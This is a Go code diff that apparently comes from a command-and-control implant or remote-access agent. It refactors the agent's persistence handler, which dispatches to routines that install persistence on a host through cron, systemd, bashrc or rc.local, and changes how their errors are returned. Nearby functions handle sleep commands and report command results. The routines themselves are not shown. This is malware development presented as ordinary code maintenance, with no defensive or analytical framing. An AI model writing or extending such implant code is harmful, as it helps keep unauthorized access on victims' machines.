@@ -506,20 +506,32 @@ func (a *Agent) handleSleep(payload string) (string, error) {
 }
 
 func (a *Agent) handlePersist(method string) (string, error) {
+	var err error
 	switch method {
-	case "cron":
-		return "cron persistence installed", PersistCron()
+	case "cron", "":
+		err = PersistCron()
+		if err == nil {
+			return "cron persistence installed", nil
+		}
 	case "systemd":
-		return "systemd persistence installed", PersistSystemd()
+		err = PersistSystemd()
+		if err == nil {
+			return "systemd persistence installed", nil
+		}
 	case "bashrc":
-		return "bashrc persistence installed", PersistBashRC()
+		err = PersistBashRC()
+		if err == nil {
+			return "bashrc persistence installed", nil
+		}
 	case "rc.local":
-		return "rc.local persistence installed", PersistRCLocal()
-	case "":
-		return "cron persistence installed", PersistCron()
+		err = PersistRCLocal()
+		if err == nil {
+			return "rc.local persistence installed", nil
+		}
 	default:
 		return "", fmt.Errorf("unknown persistence method: %s", method)
 	}
+	return "", err
 }
 
 func (a *Agent) reportResult(ctx context.Context, cmdID, output, status string) {
